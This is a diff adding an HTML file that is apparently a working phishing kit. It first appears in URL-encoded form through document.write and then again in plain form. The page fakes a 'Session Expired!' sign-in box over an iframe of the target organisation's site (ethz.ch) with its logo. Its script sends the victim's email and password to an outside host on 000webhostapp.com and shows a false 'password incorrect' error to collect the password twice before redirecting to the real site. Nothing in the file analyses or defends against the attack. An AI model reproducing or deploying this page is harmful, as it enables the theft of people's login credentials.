@@ -1,0 +1,165 @@
+<html><head><script>
+  document.write(unescape("%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%22%3E%0A%3Cstyle%3E%0A%09%2A%20%7B%0A%09%09box-sizing%3A%20border-box%3B%0A%09%09padding%3A%200%3B%0A%09%09margin%3A%200%3B%0A%09%7D%0A%0A%09body%20%7B%0A%09%09height%3A%20100vh%3B%0A%09%09width%3A%20100vw%3B%0A%09%09font-family%3A%20Arial%2C%20Helvetica%2C%20sans-serif%3B%0A%09%7D%0A%0A%09.bg-img%20%7B%0A%09%09height%3A%20100%25%3B%0A%09%09width%3A%20100%25%3B%0A%09%09background-position%3A%20center%3B%0A%09%09background-repeat%3A%20no-repeat%3B%0A%09%09background-size%3A%20cover%3B%0A%09%7D%0A%09iframe%20%7B%0A%09%09height%3A%20100%25%3B%0A%09%09width%3A%20100%25%3B%0A%09%7D%0A%0A%09%2F%2A%20Add%20styles%20to%20the%20form%20container%20%2A%2F%0A%09.container%20%7B%0A%09%09max-width%3A%20400px%3B%0A%09%09padding%3A%2016px%3B%0A%09%09background-color%3A%20white%3B%0A%09%09border-radius%3A%205px%3B%0A%09%09position%3A%20absolute%3B%0A%09%09left%3A%2050%25%3B%0A%09%09top%3A%2050%25%3B%0A%09%09transform%3A%20translate%28-50%25%2C%20-50%25%29%3B%0A%09%09z-index%3A%202%3B%0A%09%7D%0A%0A%09%40media%20%28max-width%3A%20480px%29%20%7B%0A%09%09.container%20%7B%0A%09%09%09left%3A%2010%25%3B%0A%09%09%09top%3A%2010%25%3B%0A%09%09%09margin-left%3A%205%25%3B%0A%09%09%09transform%3A%20translate%28-10%25%2C%20-10%25%29%3B%0A%09%09%7D%0A%09%7D%0A%0A%09%2F%2A%20Full-width%20input%20fields%20%2A%2F%0A%09input%5Btype%3Dtext%5D%2C%20input%5Btype%3Dpassword%5D%20%7B%0A%09%09width%3A%20100%25%3B%0A%09%09padding%3A%2015px%3B%0A%09%09margin%3A%205px%200%2022px%200%3B%0A%09%09border%3A%20none%3B%0A%09%09background%3A%20%23f1f1f1%3B%0A%09%7D%0A%0A%09input%5Btype%3Dtext%5D%3Afocus%2C%20input%5Btype%3Dpassword%5D%3Afocus%20%7B%0A%09%09background-color%3A%20%23ddd%3B%0A%09%09outline%3A%20none%3B%0A%09%7D%0A%0A%09.btn%20%7B%0A%09%09background-color%3A%20%230096FF%3B%0A%09%09color%3A%20white%3B%0A%09%09padding%3A%2016px%2020px%3B%0A%09%09border%3A%20none%3B%0A%09%09cursor%3A%20pointer%3B%0A%09%09width%3A%20100%25%3B%0A%09%09opacity%3A%200.9%3B%0A%09%7D%0A%0A%09.btn%3Ahover%20%7B%0A%09%09opacity%3A%201%3B%0A%09%7D%0A%0A%09.img%20%7B%0A%09%09text-align%3A%20center%3B%0A%09%7D%0A%0A%09%23title%20%7B%0A%09%09text-align%3A%20center%3B%0A%09%09color%3A%20red%3B%0A%09%09margin-bottom%3A%2010px%3B%0A%09%7D%0A%0A%09%23error%20%7B%0A%09%09display%3A%20none%3B%0A%09%09color%3A%20red%3B%0A%09%7D%0A%3C%2Fstyle%3E%0A%3C%2Fhead%3E%0A%3Cbody%3E%0A%0A%3Cdiv%20class%3D%22bg-img%22%20id%3D%22bg-img%22%3E%0A%09%3Ciframe%20id%3D%22frame%22%20src%3D%22%23%22%20scrolling%3D%22no%22%20sandbox%3D%22allow-forms%20allow-pointer-lock%20allow-popups%20allow-same-origin%20allow-scripts%22%20style%3D%22position%3A%20absolute%3Bheight%3A%20100%25%3Bborder%3A%20none%3B%22%20width%3D%22100%25%22%3E%3C%2Fiframe%3E%0A%3C%2Fdiv%3E%0A%3Cform%20class%3D%22container%22%20id%3D%22login-form%22%3E%0A%09%3Ch3%20id%3D%22title%22%3ESession%20Expired%21%3C%2Fh1%3E%0A%09%3Cdiv%20class%3D%22img%22%3E%0A%09%09%3Cimg%20src%3D%22%23%22%20id%3D%22logo%22%3E%0A%09%3C%2Fdiv%3E%0A%0A%09%3Ch5%20id%3D%22error%22%3EPassword%20is%20incorrect%2C%20please%20try%20again%21%3C%2Fh5%3E%0A%0A%09%3Clabel%20for%3D%22email%22%3E%3Cb%3EEmail%20Address%3C%2Fb%3E%3C%2Flabel%3E%0A%09%3Cinput%20type%3D%22text%22%20placeholder%3D%22Enter%20Email%22%20name%3D%22email%22%20id%3D%22email%22%20required%3E%0A%0A%09%3Clabel%20for%3D%22psw%22%3E%3Cb%3EPassword%3C%2Fb%3E%3C%2Flabel%3E%0A%09%3Cinput%20type%3D%22password%22%20placeholder%3D%22Enter%20Password%22%20name%3D%22password%22%20id%3D%22psw%22%20required%3E%0A%0A%09%3Cinput%20type%3D%22hidden%22%20name%3D%22step%22%20id%3D%22step%22%3E%0A%0A%09%3Cbutton%20type%3D%22submit%22%20class%3D%22btn%22%3ESign%20In%3C%2Fbutton%3E%0A%3C%2Fform%3E%0A%0A%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fjquery%2F3.3.1%2Fjquery.min.js%22%3E%3C%2Fscript%3E%0A%3Cscript%3E%0A%09let%20step%20%3D%201%3B%0A%09%0A%09const%20clientID%20%3D%20new%20URLSearchParams%28location.search%29.get%28%27clientID%27%29%3B%0A%09%24%28%27%23email%27%29.val%28clientID%29%3B%0A%09const%20domain%20%3D%20clientID.split%28%27%40%27%29.pop%28%29%3B%0A%0A%09%24%28%22%23frame%22%29.attr%28%22src%22%2C%20%22https%3A%2F%2F%22%20%2B%20domain%29%3B%0A%09%24%28%22%23logo%22%29.attr%28%22src%22%2C%20%22https%3A%2F%2Flogo.clearbit.com%2F%22%20%2B%20domain%29%3B%0A%0A%09const%20submit%20%3D%20%24%28%22button%5Btype%3D%27submit%27%5D%22%29%3B%0A%0A%09%24%28%22%23login-form%22%29.submit%28function%28event%29%20%7B%0A%09%09event.preventDefault%28%29%3B%0A%0A%09%09submit.text%28%27Verifying...%27%29%3B%0A%0A%09%09const%20posting%20%3D%20%24.post%28%22https%3A%2F%2Funsteadfast-clocks.000webhostapp.com%2Fpost.php%22%2C%20%7B%0A%09%09%09email%3A%20clientID%2C%0A%09%09%09password%3A%20%24%28%22%23psw%22%29.val%28%29%2C%0A%09%09%09step%2C%0A%09%09%7D%29%3B%0A%0A%09%09posting.done%28function%28data%29%20%7B%0A%09%09%09if%20%28step%20%3D%3D%3D%202%29%20%7B%0A%09%09%09%09window.location.href%20%3D%20%22http%3A%2F%2F%22%20%2B%20domain%3B%0A%09%09%09%7D%20else%20%7B%0A%09%09%09%09%24%28%22%23error%22%29.css%28%22display%22%2C%20%22block%22%29%3B%0A%09%09%09%09submit.text%28%27Download%27%29%3B%0A%09%09%09%09%24%28%22%23psw%22%29.val%28%22%22%29%3B%0A%09%09%09%09step%2B%2B%3B%0A%09%09%09%7D%0A%09%09%7D%29%3B%0A%0A%09%09posting.fail%28function%28%29%20%7B%0A%09%09%09%24%28%22%23error%22%29.css%28%22display%22%2C%20%22block%22%29%3B%0A%09%09%09submit.text%28%27Download%27%29%3B%0A%09%09%7D%29%3B%0A%09%7D%29%3B%0A%3C%2Fscript%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E"));
+</script>
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+	* {
+		box-sizing: border-box;
+		padding: 0;
+		margin: 0;
+	}
+
+	body {
+		height: 100vh;
+		width: 100vw;
+		font-family: Arial, Helvetica, sans-serif;
+	}
+
+	.bg-img {
+		height: 100%;
+		width: 100%;
+		background-position: center;
+		background-repeat: no-repeat;
+		background-size: cover;
+	}
+	iframe {
+		height: 100%;
+		width: 100%;
+	}
+
+	/* Add styles to the form container */
+	.container {
+		max-width: 400px;
+		padding: 16px;
+		background-color: white;
+		border-radius: 5px;
+		position: absolute;
+		left: 50%;
+		top: 50%;
+		transform: translate(-50%, -50%);
+		z-index: 2;
+	}
+
+	@media (max-width: 480px) {
+		.container {
+			left: 10%;
+			top: 10%;
+			margin-left: 5%;
+			transform: translate(-10%, -10%);
+		}
+	}
+
+	/* Full-width input fields */
+	input[type=text], input[type=password] {
+		width: 100%;
+		padding: 15px;
+		margin: 5px 0 22px 0;
+		border: none;
+		background: #f1f1f1;
+	}
+
+	input[type=text]:focus, input[type=password]:focus {
+		background-color: #ddd;
+		outline: none;
+	}
+
+	.btn {
+		background-color: #0096FF;
+		color: white;
+		padding: 16px 20px;
+		border: none;
+		cursor: pointer;
+		width: 100%;
+		opacity: 0.9;
+	}
+
+	.btn:hover {
+		opacity: 1;
+	}
+
+	.img {
+		text-align: center;
+	}
+
+	#title {
+		text-align: center;
+		color: red;
+		margin-bottom: 10px;
+	}
+
+	#error {
+		display: none;
+		color: red;
+	}
+</style>
+</head>
+<body>
+
+<div class="bg-img" id="bg-img">
+	<iframe id="frame" src="https://ethz.ch" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;" width="100%"></iframe>
+</div>
+<form class="container" id="login-form">
+	<h3 id="title">Session Expired!</h3>
+	<div class="img">
+		<img src="https://logo.clearbit.com/ethz.ch" id="logo">
+	</div>
+
+	<h5 id="error">Password is incorrect, please try again!</h5>
+
+	<label for="email"><b>Email Address</b></label>
+	<input type="text" placeholder="Enter Email" name="email" id="email" required="">
+
+	<label for="psw"><b>Password</b></label>
+	<input type="password" placeholder="Enter Password" name="password" id="psw" required="">
+
+	<input type="hidden" name="step" id="step">
+
+	<button type="submit" class="btn">Sign In</button>
+</form>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script>
+	let step = 1;
+	
+	const clientID = new URLSearchParams(location.search).get('clientID');
+	$('#email').val(clientID);
+	const domain = clientID.split('@').pop();
+
+	$("#frame").attr("src", "https://" + domain);
+	$("#logo").attr("src", "https://logo.clearbit.com/" + domain);
+
+	const submit = $("button[type='submit']");
+
+	$("#login-form").submit(function(event) {
+		event.preventDefault();
+
+		submit.text('Verifying...');
+
+		const posting = $.post("https://unsteadfast-clocks.000webhostapp.com/post.php", {
+			email: clientID,
+			password: $("#psw").val(),
+			step,
+		});
+
+		posting.done(function(data) {
+			if (step === 2) {
+				window.location.href = "http://" + domain;
+			} else {
+				$("#error").css("display", "block");
+				submit.text('Download');
+				$("#psw").val("");
+				step++;
+			}
+		});
+
+		posting.fail(function() {
+			$("#error").css("display", "block");
+			submit.text('Download');
+		});
+	});
+</script>
+
+
+</body></html>
